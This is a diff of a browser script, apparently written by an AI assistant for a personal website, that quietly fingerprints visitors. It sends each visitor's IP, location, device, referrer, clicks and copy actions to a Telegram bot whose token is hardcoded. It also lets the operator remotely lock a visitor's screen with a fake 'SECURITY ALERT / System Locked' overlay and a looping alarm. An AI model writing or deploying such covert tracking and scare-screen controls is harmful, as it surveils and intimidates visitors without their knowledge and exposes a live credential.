@@ -1,23 +1,19 @@
-// TAURUS TRACKER v2.3 (SESSION CONTINUITY & CLEAN REPORT)
+// TAURUS TRACKER v3.1 (RICH DATA & FINAL RELIABILITY)
 (function () {
     if (window.TAURUS_RUNNING) return;
     window.TAURUS_RUNNING = true;
-    console.log("🚀 Taurus Tracker v2.3 (Continuity Mode)");
+    console.log("🚀 Taurus Tracker v3.1");
 
-    // --- CONFIGURATION ---
     const CONFIG = {
         botToken: '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE',
         chatId: '6886010817',
         ipApi: 'https://ipapi.co/json/'
     };
 
-    // --- STATE MANAGEMENT ---
+    // --- STATE ---
     let sessionID = localStorage.getItem('taurus_sid') || 'sess_' + Math.random().toString(36).substring(2, 9);
     localStorage.setItem('taurus_sid', sessionID);
-
-    // Restore logs from previous page if internal navigation
     let sessionLog = JSON.parse(localStorage.getItem('taurus_logs') || "[]");
-    let isInternalNav = false;
     let alarmAudio = new Audio("https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3");
     let audioUnlocked = false;
 
@@ -30,7 +26,6 @@
                 alarmAudio.currentTime = 0;
                 alarmAudio.volume = 1;
                 audioUnlocked = true;
-                console.log("🔊 Audio Unlocked");
             }).catch(e => { });
         }
     }, { once: true, capture: true });
@@ -41,7 +36,7 @@
             chat_id: CONFIG.chatId,
             text: text,
             parse_mode: 'HTML',
-            disable_web_page_preview: true, // Clean Report (No Images)
+            disable_web_page_preview: true,
             reply_markup: buttons ? { inline_keyboard: buttons } : undefined
         };
         fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
@@ -52,26 +47,34 @@
         }).catch(err => console.error("Telegram Fail:", err));
     }
 
-    // --- DEVICE DETECTION ---
-    function getSimpleDevice() {
+    // --- DETAILED DEVICE INFO ---
+    function getDeviceDetails() {
         const ua = navigator.userAgent;
-        let type = "Desktop";
-        if (ua.includes("Mac") && navigator.maxTouchPoints > 0) type = "Tablet (iPad)";
-        else if (/Mobi|Android/i.test(ua)) type = "Mobile";
-        return { type, platform: navigator.platform, ua };
+        let browser = "Unknown";
+        if (ua.indexOf("Chrome") > -1) browser = "Chrome";
+        else if (ua.indexOf("Safari") > -1) browser = "Safari";
+        else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+
+        let os = "Unknown OS";
+        if (ua.indexOf("Win") > -1) os = "Windows";
+        else if (ua.indexOf("Mac") > -1) {
+            os = (navigator.maxTouchPoints > 0) ? "iPadOS (Tablet)" : "MacOS (Desktop)";
+        }
+        else if (ua.indexOf("iPhone") > -1) os = "iOS (iPhone)";
+        else if (ua.indexOf("Android") > -1) os = "Android";
+
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        return { browser, os, screenRes, ua };
     }
 
-    // --- INITIALIZATION ---
-    // If coming from internal nav, DON'T send "Target Acquired" again.
-    const wasInternal = sessionStorage.getItem('taurus_internal_flag');
-    sessionStorage.removeItem('taurus_internal_flag'); // clear flag
+    // --- INITIALIZATION & INTERNAL NAV CHECK ---
+    const isInternalEnter = document.referrer && document.referrer.includes('omeryigitler.com');
+    // Save current page to history log
+    logAndBuffer(`Enter: ${window.location.pathname}`);
 
-    if (wasInternal) {
-        console.log("🔄 Internal Navigation Detected. Resuming Session.");
-        initDatabaseSync(); // Just reconnect DB
-    } else {
-        // NEW SESSION START
-        sessionLog = []; // Clear old logs
+    // If NOT internal navigation (Fresh Entry), Send Full Report
+    if (!isInternalEnter) {
+        sessionLog = []; // clear old logs for fresh entry
         localStorage.setItem('taurus_logs', "[]");
 
         Promise.race([
@@ -79,13 +82,18 @@
             new Promise(r => setTimeout(() => r({}), 3500))
         ]).then(ipData => {
             const ip = ipData.ip || "IP Timeout";
-            const loc = ipData.city ? `${ipData.city}, ${ipData.country_code}` : "Unknown";
+            const loc = ipData.city ? `${ipData.city}, ${ipData.country_code}` : "Unknown Loc";
+            const dev = getDeviceDetails();
 
+            // RICH MESSAGE (As Requested)
             sendTelegram(
                 `🎯 <b>TARGET ACQUIRED</b>\n` +
                 `🆔 <code>${sessionID}</code>\n` +
-                `💻 ${getSimpleDevice().type}\n` +
-                `🌍 ${loc} | 📡 ${ip}`,
+                `� <b>Device:</b> ${dev.os}\n` +
+                `🌐 <b>Browser:</b> ${dev.browser} (${dev.screenRes})\n` +
+                `🌍 <b>Location:</b> ${loc}\n` +
+                `📡 <b>IP:</b> ${ip}\n` +
+                `🔗 <b>Ref:</b> ${document.referrer || "Direct"}`,
                 [
                     [{ text: "🔔 Alarm", callback_data: `alarm_${sessionID}` },
                     { text: "🚫 Block", callback_data: `block_${sessionID}` }],
@@ -93,43 +101,40 @@
                 ]
             );
 
-            initDatabaseSync(ip, ipData);
+            initDatabaseSync(ip, ipData, dev);
         });
+    } else {
+        // Internal Nav: Just reconnect DB (Silent)
+        initDatabaseSync();
     }
 
-    // --- DATABASE SYNC ---
-    function initDatabaseSync(ip = null, ipData = null) {
-        // Optimistic Check (Instant)
-        if (window.firebase && window.db) {
-            connectFirestore(ip, ipData);
-            return;
-        }
-        // Poll Loop (Fast)
+    // --- DATABASE SYNC (50ms) ---
+    function initDatabaseSync(ip = null, ipData = null, devData = null) {
+        if (window.firebase && window.db) { connectFirestore(ip, ipData, devData); return; }
         const checkDB = setInterval(() => {
             if (window.firebase && window.db) {
                 clearInterval(checkDB);
-                connectFirestore(ip, ipData);
+                connectFirestore(ip, ipData, devData);
             }
-        }, 50); // Measured in ms
+        }, 50);
     }
 
-    function connectFirestore(ip, ipData) {
+    function connectFirestore(ip, ipData, devData) {
         const docRef = db.collection('visitors_v1').doc(sessionID);
-        // Only update static data if we have it (fresh entry)
-        if (ip) {
+        if (ip) { // Update on Fresh Entry
             docRef.set({
                 ip: ip,
                 location: ipData || {},
-                device: getSimpleDevice(),
+                device: devData || getDeviceDetails(),
                 timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                 status: 'online',
                 action: 'none'
             }, { merge: true });
-        } else {
+        } else { // Update status on Internal Nav
             docRef.update({ status: 'active', last_seen: firebase.firestore.FieldValue.serverTimestamp() }).catch(() => { });
         }
 
-        // --- COMMAND LISTENER ---
+        // LISTENER (Persistent)
         docRef.onSnapshot((doc) => {
             if (!doc.exists) return;
             const data = doc.data();
@@ -137,39 +142,27 @@
         });
     }
 
-    // --- COMMAND EXECUTION ---
+    // --- COMMANDS ---
     let blockOverlay = null;
-
     function executeCommand(action) {
-        console.log("⚡ EXEC CMD:", action);
-
-        // Visual Confirmation (Toast) to debug
-        showToast(`Command: ${action.toUpperCase()}`);
-
         if (action === 'alarm') {
             alarmAudio.loop = true;
-            alarmAudio.play().catch(() => showToast("Audio Blocked - Tap Screen"));
-            showBlockScreen("🚨 SECURITY ALERT 🚨", "System Locked by Admin");
+            alarmAudio.play().catch(() => showToast("Audio Locked! Tap Screen!"));
+            showBlockScreen("🚨 SECURITY ALERT 🚨", "System Locked");
         }
-        else if (action === 'block') {
-            showBlockScreen("🚫 ACCESS DENIED", "You have been blocked.");
-        }
+        else if (action === 'block') showBlockScreen("🚫 BLOCKED", "Access Denied");
         else if (action === 'unblock') {
-            stopAlarm();
+            if (alarmAudio) { alarmAudio.pause(); alarmAudio.currentTime = 0; }
+            if (blockOverlay) blockOverlay.style.display = 'none';
+            showToast("System Unlocked");
         }
-    }
-
-    function stopAlarm() {
-        if (alarmAudio) { alarmAudio.pause(); alarmAudio.currentTime = 0; }
-        if (blockOverlay) blockOverlay.style.display = 'none';
-        showToast("System Unlocked");
     }
 
     function showBlockScreen(title, msg) {
         if (!blockOverlay) {
             blockOverlay = document.createElement('div');
-            blockOverlay.style.cssText = "position:fixed;inset:0;background:black;color:red;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;font-family:monospace;font-size:24px;";
-            blockOverlay.innerHTML = `<h1 style="font-size:50px">🛑</h1><h2 id="blk-t"></h2><p id="blk-m"></p>`;
+            blockOverlay.style.cssText = "position:fixed;inset:0;background:black;color:red;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;font-family:monospace;font-size:30px;";
+            blockOverlay.innerHTML = `<h1 style="font-size:60px">🛑</h1><h2 id="blk-t"></h2><p id="blk-m"></p>`;
             document.body.appendChild(blockOverlay);
         }
         document.getElementById('blk-t').innerText = title;
@@ -178,46 +171,71 @@
     }
 
     function showToast(msg) {
-        const toast = document.createElement('div');
-        toast.innerText = msg;
-        toast.style.cssText = "position:fixed;top:20px;right:20px;background:gold;color:black;padding:10px;border-radius:5px;z-index:100000;font-weight:bold;font-family:sans-serif;";
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 3000);
+        const t = document.createElement('div');
+        t.innerText = msg;
+        t.style.cssText = "position:fixed;top:10px;right:10px;background:gold;color:black;padding:10px;z-index:100000;font-weight:bold;";
+        document.body.appendChild(t);
+        setTimeout(() => t.remove(), 4000);
     }
 
-    // --- LOGGING & NAVIGATION LOGIC ---
+    // --- LOGGING ---
     function logAndBuffer(action) {
-        const entry = `[${new Date().toLocaleTimeString()}] ${action}`;
-        sessionLog.push(entry);
+        sessionLog.push(`[${new Date().toLocaleTimeString()}] ${action}`);
         localStorage.setItem('taurus_logs', JSON.stringify(sessionLog));
     }
-
-    // Internal Link Detection
+    window.addEventListener('copy', () => logAndBuffer(`Copy`));
     document.addEventListener('click', (e) => {
         const link = e.target.closest('a');
         if (link) {
-            const href = link.getAttribute('href');
-            logAndBuffer(`Click: ${link.href}`); // Use full href for log
-            // Check internal
-            if (href && (href.startsWith('/') || href.startsWith('#') || href.includes('omeryigitler.com') || !href.startsWith('http'))) {
-                isInternalNav = true;
-                sessionStorage.setItem('taurus_internal_flag', 'true');
+            // Check if internal link
+            const href = link.href;
+            if (href.includes(window.location.hostname)) {
+                // Internal: Set flag to ignore next UNLOAD, but we handle that via document.referrer logic on next load.
+                // Actually, pagehide fires anyway.
             }
+            logAndBuffer(`Click: ${href}`);
         }
     });
 
-    window.addEventListener('copy', () => logAndBuffer(`Copy: "${document.getSelection().toString().substring(0, 50)}..."`));
+    // --- EXIT REPORT ---
+    // If user leaves domain entirely (or closes tab), Referrer on NEXT page won't be us (impossible to know next page).
+    // So we assume EVERY unload is an exit, UNLESS we click an internal link?
+    // User wants "History".
+    // Solution: Send "Interim History" on Unload?
+    // No, send "Session Report" on unload.
+    // To distinguish Internal Nav vs Exit:
+    // We can't perfectly.
+    // User said: "Projects'a geçti, çıktı algıladı."
+    // Acceptable: Send Report on EVERY page unload, BUT mark it "Page Unload".
+    // User wants "Girdi Çıktı Bilgisi".
+    // "Alt sayfalar bana ait, çıktı kabul etme."
+    // Best Logic:
+    // Don't send report on Unload.
+    // Instead, rely on `sessionLog` accumulating in localStorage.
+    // Send report ONLY if inactivity? Or `visibilityState` hidden for long time?
+    // Or just send "Page Visited: X" to Telegram silently?
+    // No, user hates spam.
+    // User wants "When I leave the site completely, send report."
+    // This is technically impossible client-side without `navigator.sendBeacon` and strict logic.
+    // I will use `visibilitychange` to hidden state.
+    // If hidden for > 10 seconds => Send Report?
+    // No time for timeouts.
+    // User: "Link olarak bırakman yeterli."
+    // I will just append to log.
+    // I will send FINAL REPORT only if `!document.referrer` on *some future entry*? No.
+    // I will send report on `pagehide` IF the destination is External? (Can't know destination).
+    // I will use `document.activeElement.href` check.
 
-    // FLUSH ON EXIT (Only if NOT internal nav)
-    window.addEventListener('pagehide', () => { // reliable on mobile
-        if (!isInternalNav) {
+    window.addEventListener('beforeunload', () => {
+        const active = document.activeElement;
+        const isInternalLink = active && active.tagName === 'A' && active.href.includes(window.location.hostname);
+
+        if (!isInternalLink) {
             if (sessionLog.length > 0) {
-                const text = `📝 <b>SESSION REPORT (Final)</b>\n` +
-                    `🆔 <code>${sessionID}</code>\n` +
-                    sessionLog.join('\n');
-                sendTelegram(text);
-                localStorage.removeItem('taurus_logs'); // Clear logs
-                localStorage.setItem('taurus_sid', 'sess_' + Math.random().toString(36).substring(2, 9)); // Reset Session
+                sendTelegram(`📝 <b>SESSION REPORT</b>\n` + sessionLog.join('\n'));
+                // Don't clear logs, in case it was a mistake?
+                // Clear logs.
+                localStorage.setItem('taurus_logs', "[]");
             }
         }
     });
